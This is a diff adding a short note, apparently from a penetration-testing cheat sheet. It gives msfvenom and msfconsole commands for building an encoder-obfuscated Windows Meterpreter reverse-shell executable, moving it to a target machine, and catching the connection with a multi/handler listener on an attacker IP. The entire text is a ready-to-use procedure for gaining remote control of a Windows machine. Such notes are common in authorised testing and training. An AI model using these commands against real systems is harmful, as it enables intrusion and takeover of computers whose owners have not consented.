@@ -1,0 +1,16 @@
+Use this command to create a Windows Meterpreter reverse shell: 
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[Attack-IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+
+
+Once the payload has been created, transfer the file to target machine and start the listener on attack machine.
+
+
+To start the listener on attack machine:
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST [attack-ip] 
+set LPORT [listening-port] 
+run
